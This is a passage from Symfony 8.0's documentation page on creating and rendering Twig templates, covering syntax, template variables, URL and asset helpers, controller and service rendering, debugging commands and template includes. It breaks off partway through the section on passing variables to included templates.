# Source: https://symfony.com/doc/8.0/templates.html

Title: Creating and Using Templates (Symfony Docs)

URL Source: https://symfony.com/doc/8.0/templates.html

Markdown Content:
Creating and Using Templates (Symfony Docs)
===============

[Skip to content](https://symfony.com/doc/8.0/templates.html#main-content)

[](https://symfony.com/)

Close

* About

  * [What is Symfony?](https://symfony.com/what-is-symfony)
  * [Community](https://symfony.com/community)
  * [News](https://symfony.com/blog/)
  * [Contributing](https://symfony.com/doc/current/contributing/index.html)
  * [Support](https://symfony.com/support)

* Documentation

  * [Symfony Docs](https://symfony.com/doc)
  * [Symfony Book](https://symfony.com/book)
  * [Screencasts](https://symfonycasts.com/)
  * [Symfony Bundles](https://symfony.com/bundles)
  * [Symfony Cloud](https://symfony.com/doc/cloud/)
  * [Training](https://sensiolabs.com/training?utm_source=symfony&utm_medium=symfony_submenu&utm_campaign=permanent_referral)

* Services

  * [Upsun for Symfony](https://symfony.com/cloud/)Best platform to deploy Symfony apps
  * [SymfonyInsight](https://insight.symfony.com/)Automatic quality checks for your apps
  * [Symfony Certification](https://certification.symfony.com/)Prove your knowledge and boost your career
  * [SensioLabs](https://sensiolabs.com/?utm_source=symfony&utm_medium=symfony_submenu&utm_campaign=permanent_referral)Professional services to help you with Symfony
  * [Blackfire](https://www.blackfire.io/?utm_source=symfony&utm_medium=symfonycom_footer&utm_campaign=profiler)Profile and monitor performance of your apps

* Other
* [Blog](https://symfony.com/blog/)
* [Download](https://symfony.com/download)

sponsored by[](https://sensiolabs.com/?utm_source=symfony&utm_medium=symfony_sponsoredby&utm_campaign=permanent_referral "SensioLabs, PHP services and software solutions for enterprise and community.")

1. [Home](https://symfony.com/)
2. [Documentation](https://symfony.com/doc)
3. Creating and Using Templates

 Search Symfony Docs

Version:

Table of Contents

* [Installation](https://symfony.com/doc/8.0/templates.html#installation)
* [Twig Templating Language](https://symfony.com/doc/8.0/templates.html#twig-templating-language)
  * [Twig Configuration](https://symfony.com/doc/8.0/templates.html#twig-configuration)

* [Creating Templates](https://symfony.com/doc/8.0/templates.html#creating-templates)
  * [Template Naming](https://symfony.com/doc/8.0/templates.html#template-naming)
  * [Template Location](https://symfony.com/doc/8.0/templates.html#template-location)
  * [Template Variables](https://symfony.com/doc/8.0/templates.html#template-variables)
  * [Linking to Pages](https://symfony.com/doc/8.0/templates.html#linking-to-pages)
  * [Linking to CSS, JavaScript and Image Assets](https://symfony.com/doc/8.0/templates.html#linking-to-css-javascript-and-image-assets)
  * [Build, Versioning & More Advanced CSS, JavaScript and Image Handling](https://symfony.com/doc/8.0/templates.html#build-versioning-more-advanced-css-javascript-and-image-handling)
  * [The App Global Variable](https://symfony.com/doc/8.0/templates.html#the-app-global-variable)
  * [Global Variables](https://symfony.com/doc/8.0/templates.html#global-variables)

* [Twig Components](https://symfony.com/doc/8.0/templates.html#twig-components)
* [Rendering Templates](https://symfony.com/doc/8.0/templates.html#rendering-templates)
  * [Rendering a Template in Controllers](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-controllers)
  * [Rendering a Template in Services](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-services)
  * [Rendering a Template in Emails](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-emails)
  * [Rendering a Template Directly from a Route](https://symfony.com/doc/8.0/templates.html#rendering-a-template-directly-from-a-route)
  * [Checking if a Template Exists](https://symfony.com/doc/8.0/templates.html#checking-if-a-template-exists)

* [Debugging Templates](https://symfony.com/doc/8.0/templates.html#debugging-templates)
  * [Linting Twig Templates](https://symfony.com/doc/8.0/templates.html#linting-twig-templates)
  * [Inspecting Twig Information](https://symfony.com/doc/8.0/templates.html#inspecting-twig-information)
  * [The Dump Twig Utilities](https://symfony.com/doc/8.0/templates.html#the-dump-twig-utilities)

* [Reusing Template Contents](https://symfony.com/doc/8.0/templates.html#reusing-template-contents)
  * [Including Templates](https://symfony.com/doc/8.0/templates.html#including-templates)
  * [Embedding Controllers](https://symfony.com/doc/8.0/templates.html#embedding-controllers)

* [How to Embed Asynchronous Content with hinclude.js](https://symfony.com/doc/8.0/templates.html#how-to-embed-asynchronous-content-with-hinclude-js)
  * [Template Inheritance and Layouts](https://symfony.com/doc/8.0/templates.html#template-inheritance-and-layouts)

* [Output Escaping and XSS Attacks](https://symfony.com/doc/8.0/templates.html#output-escaping-and-xss-attacks)
* [Template Namespaces](https://symfony.com/doc/8.0/templates.html#template-namespaces)
  * [Bundle Templates](https://symfony.com/doc/8.0/templates.html#bundle-templates)

* [Writing a Twig Extension](https://symfony.com/doc/8.0/templates.html#writing-a-twig-extension)
  * [Create the Extension Class](https://symfony.com/doc/8.0/templates.html#create-the-extension-class)
  * [Creating Lazy-Loaded Twig Extensions](https://symfony.com/doc/8.0/templates.html#creating-lazy-loaded-twig-extensions)

Creating and Using Templates
============================

[Edit this page](https://github.com/symfony/symfony-docs/edit/8.0/templates.rst)

A template is the best way to organize and render HTML from inside your application, whether you need to render HTML from a [controller](https://symfony.com/doc/8.0/controller.html) or generate the [contents of an email](https://symfony.com/doc/8.0/mailer.html). Templates in Symfony are created with Twig: a flexible, fast, and secure template engine.

[Installation](https://symfony.com/doc/8.0/templates.html#installation "Permalink to this headline")
----------------------------------------------------------------------------------------------------

In applications using [Symfony Flex](https://symfony.com/doc/8.0/setup.html#symfony-flex), run the following command to install both Twig language support and its integration with Symfony applications:

1`$ composer require symfony/twig-bundle`

[Twig Templating Language](https://symfony.com/doc/8.0/templates.html#twig-templating-language "Permalink to this headline")
----------------------------------------------------------------------------------------------------------------------------

The [Twig](https://twig.symfony.com/) templating language allows you to write concise, readable templates that are more friendly to web designers and, in several ways, more powerful than PHP templates. Take a look at the following Twig template example. Even if it's the first time you see Twig, you probably understand most of it:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15

```
<!DOCTYPE html>
<html>
    <head>
        <title>Welcome to Symfony!</title>
    </head>
    <body>
        <h1>{{ page_title }}</h1>

        {% if user.isLoggedIn %}
            Hello {{ user.name }}!
        {% endif %}

        {# ... #}
    </body>
</html>
```

Twig syntax is based on these three constructs:

* `{{ ... }}`, used to display the content of a variable or the result of evaluating an expression;
* `{% ... %}`, used to run some logic, such as a conditional or a loop;
* `{# ... #}`, used to add comments to the template (unlike HTML comments, these comments are not included in the rendered page).

You can't run PHP code inside Twig templates, but Twig provides utilities to run some logic in the templates. For example, **filters** modify content before being rendered, like the `upper` filter to uppercase contents:

1`{{ title|upper }}`

Twig comes with a long list of [tags](https://twig.symfony.com/doc/3.x/tags/index.html), [filters](https://twig.symfony.com/doc/3.x/filters/index.html) and [functions](https://twig.symfony.com/doc/3.x/functions/index.html) that are available by default. In Symfony applications you can also use these [Twig filters and functions defined by Symfony](https://symfony.com/doc/8.0/reference/twig_reference.html) and you can [create your own Twig filters and functions](https://symfony.com/doc/8.0/templates.html#templates-twig-extension).

Twig is fast in the `prod`[environment](https://symfony.com/doc/8.0/configuration.html#configuration-environments) (because templates are compiled into PHP and cached automatically), but convenient to use in the `dev` environment (because templates are recompiled automatically when you change them).

### [Twig Configuration](https://symfony.com/doc/8.0/templates.html#twig-configuration "Permalink to this headline")

Twig has several configuration options to define things like the format used to display numbers and dates, the template caching, etc. Read the [Twig configuration reference](https://symfony.com/doc/8.0/reference/configuration/twig.html) to learn about them.

[Creating Templates](https://symfony.com/doc/8.0/templates.html#creating-templates "Permalink to this headline")
----------------------------------------------------------------------------------------------------------------

Before explaining in detail how to create and render templates, look at the following example for a quick overview of the whole process. First, you need to create a new file in the `templates/` directory to store the template contents:

1
2
3

```
{# templates/user/notifications.html.twig #}
<h1>Hello {{ user_first_name }}!</h1>
<p>You have {{ notifications|length }} new notifications.</p>
```

Then, create a [controller](https://symfony.com/doc/8.0/controller.html) that renders this template and passes to it the needed variables:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26

```
// src/Controller/UserController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class UserController extends AbstractController
{
    // ...

    public function notifications(): Response
    {
        // get the user information and notifications somehow
        $userFirstName = '...';
        $userNotifications = ['...', '...'];

        // the template path is the relative file path from `templates/`
        return $this->render('user/notifications.html.twig', [
            // this array defines the variables passed to the template,
            // where the key is the variable name and the value is the variable value
            // (Twig recommends using snake_case variable names: 'foo_bar' instead of 'fooBar')
            'user_first_name' => $userFirstName,
            'notifications' => $userNotifications,
        ]);
    }
}
```

### [Template Naming](https://symfony.com/doc/8.0/templates.html#template-naming "Permalink to this headline")

Symfony recommends the following for template names:

* Use [snake case](https://en.wikipedia.org/wiki/Snake_case) for filenames and directories (e.g. `blog_posts.html.twig`, `admin/default_theme/blog/index.html.twig`, etc.);
* Define two extensions for filenames (e.g. `index.html.twig` or `blog_posts.xml.twig`) being the first extension (`html`, `xml`, etc.) the final format that the template will generate.

Although templates usually generate HTML contents, they can generate any text-based format. That's why the two-extension convention simplifies the way templates are created and rendered for multiple formats.

### [Template Location](https://symfony.com/doc/8.0/templates.html#template-location "Permalink to this headline")

Templates are stored by default in the `templates/` directory. When a service or controller renders the `product/index.html.twig` template, they are actually referring to the `<your-project>/templates/product/index.html.twig` file.

The default templates directory is configurable with the [twig.default_path](https://symfony.com/doc/8.0/reference/configuration/twig.html#config-twig-default-path) option and you can add more template directories [as explained later](https://symfony.com/doc/8.0/templates.html#templates-namespaces) in this article.

### [Template Variables](https://symfony.com/doc/8.0/templates.html#template-variables "Permalink to this headline")

A common need for templates is to print the values stored in the templates passed from the controller or service. Variables usually store objects and arrays instead of strings, numbers and boolean values. That's why Twig provides quick access to complex PHP variables. Consider the following template:

1`<p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>`

The `user.name` notation means that you want to display some information (`name`) stored in a variable (`user`). Is `user` an array or an object? Is `name` a property or a method? In Twig this doesn't matter.

When using the `foo.bar` notation, Twig tries to get the value of the variable in the following order:

1. `$foo['bar']` (array and element);
2. `$foo->bar` (object and public property);
3. `$foo->bar()` (object and public method);
4. `$foo->getBar()` (object and _getter_ method);
5. `$foo->isBar()` (object and _isser_ method);
6. `$foo->hasBar()` (object and _hasser_ method);
7. If none of the above exists, use `null` (or throw a `Twig\Error\RuntimeError` exception if the [strict_variables](https://symfony.com/doc/8.0/reference/configuration/twig.html#config-twig-strict-variables) option is enabled).

This allows you to evolve your application code without having to change the template code (you can start with array variables for the application proof of concept, then move to objects with methods, etc.)

### [Linking to Pages](https://symfony.com/doc/8.0/templates.html#linking-to-pages "Permalink to this headline")

Instead of writing the link URLs by hand, use the `path()` function to generate URLs based on the [routing configuration](https://symfony.com/doc/8.0/routing.html#routing-creating-routes).

Later, if you want to modify the URL of a particular page, all you'll need to do is change the routing configuration: the templates will automatically generate the new URL.

Consider the following routing configuration:

Attributes YAML PHP

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21

```
// src/Controller/BlogController.php
namespace App\Controller;

// ...
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class BlogController extends AbstractController
{
    #[Route('/', name: 'blog_index')]
    public function index(): Response
    {
        // ...
    }

    #[Route('/article/{slug}', name: 'blog_post')]
    public function show(string $slug): Response
    {
        // ...
    }
}
```

1
2
3
4
5
6
7
8

```
# config/routes.yaml
blog_index:
    path:       /
    controller: App\Controller\BlogController::index

blog_post:
    path:       /article/{slug}
    controller: App\Controller\BlogController::show
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15

```
// config/routes.php
namespace Symfony\Component\Routing\Loader\Configurator;

use App\Controller\BlogController;

return Routes::config([
    'blog_index' => [
        'path' => '/',
        'controller' => [BlogController::class, 'index'],
    ],
    'blog_post' => [
        'path' => '/article/{slug}',
        'controller' => [BlogController::class, 'show'],
    ],
]);
```

Use the `path()` Twig function to link to these pages and pass the route name as the first argument and the route parameters as the optional second argument:

1
2
3
4
5
6
7
8
9
10
11

```
<a href="{{ path('blog_index') }}">Homepage</a>

{# ... #}

{% for post in blog_posts %}
    <h1>
        <a href="{{ path('blog_post', {slug: post.slug}) }}">{{ post.title }}</a>
    </h1>

    <p>{{ post.excerpt }}</p>
{% endfor %}
```

The `path()` function generates relative URLs. If you need to generate absolute URLs (for example when rendering templates for emails or RSS feeds), use the `url()` function, which takes the same arguments as `path()` (e.g. `<a href="{{ url('blog_index') }}"> ... </a>`).

### [Linking to CSS, JavaScript and Image Assets](https://symfony.com/doc/8.0/templates.html#linking-to-css-javascript-and-image-assets "Permalink to this headline")

If a template needs to link to a static asset (e.g. an image), Symfony provides an `asset()` Twig function to help generate that URL. First, install the `asset` package:

1`$ composer require symfony/asset`

You can now use the `asset()` function:

1
2
3
4
5
6
7
8

```
{# the image lives at "public/images/logo.png" #}
<img src="{{ asset('images/logo.png') }}" alt="Symfony!">

{# the CSS file lives at "public/css/blog.css" #}
<link href="{{ asset('css/blog.css') }}" rel="stylesheet">

{# the JS file lives at "public/bundles/acme/js/loader.js" #}
<script src="{{ asset('bundles/acme/js/loader.js') }}"></script>
```

Using the `asset()` function is recommended for these reasons:

* **Asset versioning**: `asset()` appends a version hash to asset URLs for cache busting. This works both via [AssetMapper](https://symfony.com/doc/8.0/frontend.html) and the [Asset component](https://symfony.com/doc/8.0/components/asset.html) (see also the [assets configuration options](https://symfony.com/doc/8.0/reference/configuration/framework.html#reference-assets), such as `version` and `version_format`).
* **Application portability**: whether your app is hosted at the root (e.g. `https://example.com`) or in a subdirectory (e.g. `https://example.com/my_app`), `asset()` generates the correct path (e.g. `/images/logo.png` vs `/my_app/images/logo.png`) automatically based on your app's base URL.

If you need absolute URLs for assets, use the `absolute_url()` Twig function as follows:

1
2
3

```
<img src="{{ absolute_url(asset('images/logo.png')) }}" alt="Symfony!">

<link rel="shortcut icon" href="{{ absolute_url('favicon.png') }}">
```

### [Build, Versioning & More Advanced CSS, JavaScript and Image Handling](https://symfony.com/doc/8.0/templates.html#build-versioning-more-advanced-css-javascript-and-image-handling "Permalink to this headline")

For help building and versioning your JavaScript and CSS assets in a modern way, read about [Symfony's AssetMapper](https://symfony.com/doc/8.0/frontend.html).

### [The App Global Variable](https://symfony.com/doc/8.0/templates.html#the-app-global-variable "Permalink to this headline")

Symfony creates a context object that is injected into every Twig template automatically as a variable called `app`. It provides access to some application information:

1
2
3
4
5

```
<p>Username: {{ app.user.username ?? 'Anonymous user' }}</p>
{% if app.debug %}
    <p>Request method: {{ app.request.method }}</p>
    <p>Application Environment: {{ app.environment }}</p>
{% endif %}
```

The `app` variable (which is an instance of [AppVariable](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Bridge/Twig/AppVariable.php "Symfony\Bridge\Twig\AppVariable")) gives you access to these variables:

`app.user` The [current user object](https://symfony.com/doc/8.0/security.html#create-user-class) or `null` if the user is not authenticated. `app.request` The [Request](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Component/HttpFoundation/Request.php "Symfony\Component\HttpFoundation\Request") object that stores the current [request data](https://symfony.com/doc/8.0/components/http_foundation.html#accessing-request-data) (depending on your application, this can be a [sub-request](https://symfony.com/doc/8.0/components/http_kernel.html#http-kernel-sub-requests) or a regular request). `app.session` The [Session](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Component/HttpFoundation/Session/Session.php "Symfony\Component\HttpFoundation\Session\Session") object that represents the current [user's session](https://symfony.com/doc/8.0/session.html) or `null` if there is none. `app.flashes` An array of all the [flash messages](https://symfony.com/doc/8.0/session.html#flash-messages) stored in the session. You can also get only the messages of some type (e.g. `app.flashes('notice')`). `app.environment` The name of the current [configuration environment](https://symfony.com/doc/8.0/configuration.html#configuration-environments) (`dev`, `prod`, etc). `app.debug` True if in [debug mode](https://symfony.com/doc/8.0/configuration/front_controllers_and_kernel.html#debug-mode). False otherwise. `app.token` A [TokenInterface](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Component/Security/Core/Authentication/Token/TokenInterface.php "Symfony\Component\Security\Core\Authentication\Token\TokenInterface") object representing the security token. `app.current_route` The name of the route associated with the current request or `null` if no request is available (equivalent to `app.request.attributes.get('_route')`) `app.current_route_parameters` An array with the parameters passed to the route of the current request or an empty array if no request is available (equivalent to `app.request.attributes.get('_route_params')`) `app.locale` The locale used in the current [locale switcher](https://symfony.com/doc/8.0/translation.html#locale-switcher) context. `app.enabled_locales` The locales enabled in the application.
In addition to the global `app` variable injected by Symfony, you can also inject variables automatically to all Twig templates as explained in the next section.

### [Global Variables](https://symfony.com/doc/8.0/templates.html#global-variables "Permalink to this headline")

Twig allows you to automatically inject one or more variables into all templates. These global variables are defined in the `twig.globals` option inside the main Twig configuration file:

YAML PHP

1
2
3
4
5

```
# config/packages/twig.yaml
twig:
    # ...
    globals:
        ga_tracking: 'UA-xxxxx-x'
```

1
2
3
4
5
6
7
8
9
10
11

```
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'globals' => [
            'ga_tracking' => 'UA-xxxxx-x',
        ],
    ],
]);
```

Now, the variable `ga_tracking` is available in all Twig templates, so you can use it without having to pass it explicitly from the controller or service that renders the template:

1`<p>The Google tracking code is: {{ ga_tracking }}</p>`

In addition to static values, Twig global variables can also reference services from the [service container](https://symfony.com/doc/8.0/service_container.html). The main drawback is that these services are not loaded lazily. In other words, as soon as Twig is loaded, your service is instantiated, even if you never use that global variable:

YAML PHP

1
2
3
4
5
6

```
# config/packages/twig.yaml
twig:
    # ...
    globals:
        # the value is the service's id prefixed with '@'
        uuid: '@App\Generator\UuidGenerator'
```

1
2
3
4
5
6
7
8
9
10
11

```
// config/packages/twig.php
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return App::config([
    'twig' => [
        // ...
        'globals' => [
            'uuid' => service('App\Generator\UuidGenerator'),
        ],
    ],
]);
```

Now you can use the `uuid` variable in any Twig template to access to the `UuidGenerator` service:

1`UUID: {{ uuid.generate }}`

[Twig Components](https://symfony.com/doc/8.0/templates.html#twig-components "Permalink to this headline")
----------------------------------------------------------------------------------------------------------

Twig components are an alternative way to render templates, where each template is bound to a "component class". This makes it easier to render and re-use small template "units" - like an alert, markup for a modal, or a category sidebar.

For more information, see [UX Twig Component](https://symfony.com/bundles/ux-twig-component/current/index.html).

Twig components also have one other superpower: they can become "live", where they automatically update (via Ajax) as the user interacts with them. For example, when your user types into a box, your Twig component will re-render via Ajax to show a list of results!

To learn more, see [UX Live Component](https://symfony.com/bundles/ux-live-component/current/index.html).

[Rendering Templates](https://symfony.com/doc/8.0/templates.html#rendering-templates "Permalink to this headline")
------------------------------------------------------------------------------------------------------------------

### [Rendering a Template in Controllers](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-controllers "Permalink to this headline")

If your controller extends from the [AbstractController](https://symfony.com/doc/8.0/controller.html#the-base-controller-class-services), use the `render()` helper:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

```
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    public function index(): Response
    {
        // ...

        // the `render()` method returns a `Response` object with the
        // contents created by the template
        return $this->render('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        // the `renderView()` method only returns the contents created by the
        // template, so you can use those contents later in a `Response` object
        $contents = $this->renderView('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);

        return new Response($contents);
    }
}
```

If your controller does not extend from `AbstractController`, you'll need to [fetch services in your controller](https://symfony.com/doc/8.0/controller.html#controller-accessing-services) and use the `render()` method of the `twig` service.

Another option is to use the `#[Template]` attribute on the controller method to define the template to render:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

```
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product/index.html.twig')]
    public function index(): array
    {
        // ...

        // when using the #[Template] attribute, you only need to return
        // an array with the parameters to pass to the template (the attribute
        // is the one which will create and return the Response object).
        return [
            'category' => '...',
            'promotions' => ['...', '...'],
        ];
    }
}
```

The [base AbstractController](https://symfony.com/doc/8.0/controller.html#the-base-controller-classes-services) also provides the [renderBlock()](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Bundle/FrameworkBundle/Controller/AbstractController.php#:~:text=function%20renderBlock "Symfony\Bundle\FrameworkBundle\Controller\AbstractController::renderBlock()") and [renderBlockView()](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Bundle/FrameworkBundle/Controller/AbstractController.php#:~:text=function%20renderBlockView "Symfony\Bundle\FrameworkBundle\Controller\AbstractController::renderBlockView()") methods:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

```
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    // ...

    public function price(): Response
    {
        // ...

        // the `renderBlock()` method returns a `Response` object with the
        // block contents
        return $this->renderBlock('product/index.html.twig', 'price_block', [
            // ...
        ]);

        // the `renderBlockView()` method only returns the contents created by the
        // template block, so you can use those contents later in a `Response` object
        $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [
            // ...
        ]);

        return new Response($contents);
    }
}
```

This might come handy when dealing with blocks in [templates inheritance](https://symfony.com/doc/8.0/templates.html#template_inheritance-layouts) or when using [Turbo Streams](https://symfony.com/bundles/ux-turbo/current/index.html).

Similarly, you can use the `#[Template]` attribute on the controller to specify a block to render:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17

```
// src/Controller/ProductController.php
namespace App\Controller;

use Symfony\Bridge\Twig\Attribute\Template;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;

class ProductController extends AbstractController
{
    #[Template('product.html.twig', block: 'price_block')]
    public function price(): array
    {
        return [
            // ...
        ];
    }
}
```

### [Rendering a Template in Services](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-services "Permalink to this headline")

Inject the `twig` Symfony service into your own services and use its `render()` method. When using [service autowiring](https://symfony.com/doc/8.0/service_container/autowiring.html) you only need to add an argument in the service constructor and type-hint it with the [Twig Environment](https://github.com/twigphp/Twig/blob/3.x/src/Environment.php):

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22

```
// src/Service/SomeService.php
namespace App\Service;

use Twig\Environment;

class SomeService
{
    public function __construct(
        private Environment $twig,
    ) {
    }

    public function someMethod(): void
    {
        // ...

        $htmlContents = $this->twig->render('product/index.html.twig', [
            'category' => '...',
            'promotions' => ['...', '...'],
        ]);
    }
}
```

### [Rendering a Template in Emails](https://symfony.com/doc/8.0/templates.html#rendering-a-template-in-emails "Permalink to this headline")

Read the docs about the [mailer and Twig integration](https://symfony.com/doc/8.0/mailer.html#mailer-twig).

### [Rendering a Template Directly from a Route](https://symfony.com/doc/8.0/templates.html#rendering-a-template-directly-from-a-route "Permalink to this headline")

Although templates are usually rendered in controllers and services, you can render static pages that don't need any variables directly from the route definition. Use the special [TemplateController](https://github.com/symfony/symfony/blob/8.0/src/Symfony/Bundle/FrameworkBundle/Controller/TemplateController.php "Symfony\Bundle\FrameworkBundle\Controller\TemplateController") provided by Symfony:

YAML PHP

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27

```
# config/routes.yaml
acme_privacy:
    path:          /privacy
    controller:    Symfony\Bundle\FrameworkBundle\Controller\TemplateController
    defaults:
        # the path of the template to render
        template:  'static/privacy.html.twig'

        # the response status code (default: 200)
        statusCode: 200

        # special options defined by Symfony to set the page cache
        maxAge:    86400
        sharedAge: 86400

        # whether or not caching should apply for client caches only
        private: true

        # optionally you can define some arguments passed to the template
        context:
            site_name: 'ACME'
            theme: 'dark'

        # optionally you can define HTTP headers to add to the response
        headers:
            Content-Type: 'text/html'
            foo: 'bar'
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36

```
// config/routes.php
namespace Symfony\Component\Routing\Loader\Configurator;

use Symfony\Bundle\FrameworkBundle\Controller\TemplateController;

return Routes::config([
    'acme_privacy' => [
        'path' => '/privacy',
        'controller' => TemplateController::class,
        'defaults' => [
            // the path of the template to render
            'template'  => 'static/privacy.html.twig',

            // the response status code (default: 200)
            'statusCode' => 200,

            // special options defined by Symfony to set the page cache
            'maxAge'    => 86400,
            'sharedAge' => 86400,

            // whether or not caching should apply for client caches only
            'private' => true,

            // optionally you can define some arguments passed to the template
            'context' => [
                'site_name' => 'ACME',
                'theme' => 'dark',
                ],

            // optionally you can define HTTP headers to add to the response
            'headers' => [
                'Content-Type' => 'text/html',
            ]
        ],
    ],
]);
```

### [Checking if a Template Exists](https://symfony.com/doc/8.0/templates.html#checking-if-a-template-exists "Permalink to this headline")

Templates are loaded in the application using a [Twig template loader](https://twig.symfony.com/doc/3.x/api.html#loaders), which also provides a method to check for template existence. First, get the loader:

1
2
3
4
5
6
7
8
9
10
11

```
use Twig\Environment;

class YourService
{
    // this code assumes that your service uses autowiring to inject dependencies
    // otherwise, inject the service called 'twig' manually
    public function __construct(Environment $twig)
    {
        $loader = $twig->getLoader();
    }
}
```

Then, pass the path of the Twig template to the `exists()` method of the loader:

1
2
3
4

```
if ($loader->exists('theme/layout_responsive.html.twig')) {
    // the template exists, do something
    // ...
}
```

[Debugging Templates](https://symfony.com/doc/8.0/templates.html#debugging-templates "Permalink to this headline")
------------------------------------------------------------------------------------------------------------------

Symfony provides several utilities to help you debug issues in your templates.

### [Linting Twig Templates](https://symfony.com/doc/8.0/templates.html#linting-twig-templates "Permalink to this headline")

The `lint:twig` command checks that your Twig templates don't have any syntax errors. It's useful to run it before deploying your application to production (e.g. in your continuous integration server):

1
2
3
4
5
6
7
8
9
10
11
12

```
# check all the application templates
$ php bin/console lint:twig

# you can also check directories and individual templates
$ php bin/console lint:twig templates/email/
$ php bin/console lint:twig templates/article/recent_list.html.twig

# you can also show the deprecated features used in your templates
$ php bin/console lint:twig --show-deprecations templates/email/

# you can also excludes directories
$ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool
```

When running the linter inside [GitHub Actions](https://docs.github.com/en/free-pro-team@latest/actions), the output is automatically adapted to the format required by GitHub, but you can force that format too:

1`$ php bin/console lint:twig --format=github`

### [Inspecting Twig Information](https://symfony.com/doc/8.0/templates.html#inspecting-twig-information "Permalink to this headline")

The `debug:twig` command lists all the information available about Twig (functions, filters, global variables, etc.). It's useful to check if your [custom Twig extensions](https://symfony.com/doc/8.0/templates.html#templates-twig-extension) are working properly and also to check the Twig features added when [installing packages](https://symfony.com/doc/8.0/setup.html#symfony-flex):

1
2
3
4
5
6
7
8

```
# list general information
$ php bin/console debug:twig

# filter output by any keyword
$ php bin/console debug:twig --filter=date

# pass a template path to show the physical file which will be loaded
$ php bin/console debug:twig @Twig/Exception/error.html.twig
```

### [The Dump Twig Utilities](https://symfony.com/doc/8.0/templates.html#the-dump-twig-utilities "Permalink to this headline")

Symfony provides a [dump() function](https://symfony.com/doc/8.0/components/var_dumper.html#components-var-dumper-dump) as an improved alternative to PHP's `var_dump()` function. This function is useful to inspect the contents of any variable and you can use it in Twig templates too.

First, make sure that the VarDumper component is installed in the application:

1`$ composer require --dev symfony/debug-bundle`

Then, use either the `{% dump %}` tag or the `{{ dump() }}` function depending on your needs:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18

```
{# templates/article/recent_list.html.twig #}
{# the contents of this variable are sent to the Web Debug Toolbar
   instead of dumping them inside the page contents #}
{% dump articles %}

{% for article in articles %}
    {# the contents of this variable are dumped inside the page contents
       and they are visible on the web page #}
    {{ dump(article) }}

    {# optionally, use named arguments to display them as labels next to
       the dumped contents #}
    {{ dump(blog_posts: articles, user: app.user) }}

    <a href="/article/{{ article.slug }}">
        {{ article.title }}
    </a>
{% endfor %}
```

To avoid leaking sensitive information, the `dump()` function/tag is only available in the `dev` and `test`[configuration environments](https://symfony.com/doc/8.0/configuration.html#configuration-environments). If you try to use it in the `prod` environment, you will see a PHP error.

[Reusing Template Contents](https://symfony.com/doc/8.0/templates.html#reusing-template-contents "Permalink to this headline")
------------------------------------------------------------------------------------------------------------------------------

### [Including Templates](https://symfony.com/doc/8.0/templates.html#including-templates "Permalink to this headline")

If certain Twig code is repeated in several templates, you can extract it into a single "template fragment" and include it in other templates. Imagine that the following code to display the user information is repeated in several places:

1
2
3
4
5
6
7

```
{# templates/blog/index.html.twig #}

{# ... #}
<div class="user-profile">
    <img src="{{ user.profileImageUrl }}" alt="{{ user.fullName }}">
    <p>{{ user.fullName }} - {{ user.email }}</p>
</div>
```

First, create a new Twig template called `blog/_user_profile.html.twig` (the `_` prefix is optional, but it's a convention used to better differentiate between full templates and template fragments).

Then, remove that content from the original `blog/index.html.twig` template and add the following to include the template fragment:

1
2
3
4

```
{# templates/blog/index.html.twig #}

{# ... #}
{{ include('blog/_user_profile.html.twig') }}
```

The `include()` Twig function takes as argument the path of the template to include. The included template has access to all the variables of the template that includes it (use the [with_context](https://twig.symfony.com/doc/3.x/functions/include.html) option to control this).

You can also pass variables to the included template. This is useful for example to rename variables. Imagine that your template stores the user information in a variable called `blog_post.author` instead of the `user` variable that the template fragment expects. Use the following to _rename_ the variable:

1
2
3
4

```
